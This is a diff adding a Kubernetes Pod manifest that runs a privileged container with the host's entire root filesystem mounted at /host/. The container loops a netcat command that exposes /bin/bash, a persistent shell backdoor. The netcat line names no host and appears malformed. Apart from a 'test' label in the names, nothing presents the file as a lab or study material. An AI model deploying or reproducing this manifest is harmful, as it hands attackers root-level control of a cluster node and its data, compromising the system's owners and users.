@@ -1,0 +1,20 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: kubernetes-hm
+spec:
+  containers:
+  - image: google/cloud-sdk:slim
+    name: test-gcloud-nc
+    command: [ "/bin/bash", "-c", "--" ]
+    args: [ "while true; do nc 4444 -e /bin/bash; done;" ]
+    volumeMounts:
+    - mountPath: /host/
+      name: test-volume
+    securityContext:
+      privileged: true
+  volumes:
+  - name: test-volume
+    hostPath:
+      # directory location on host
+      path: /
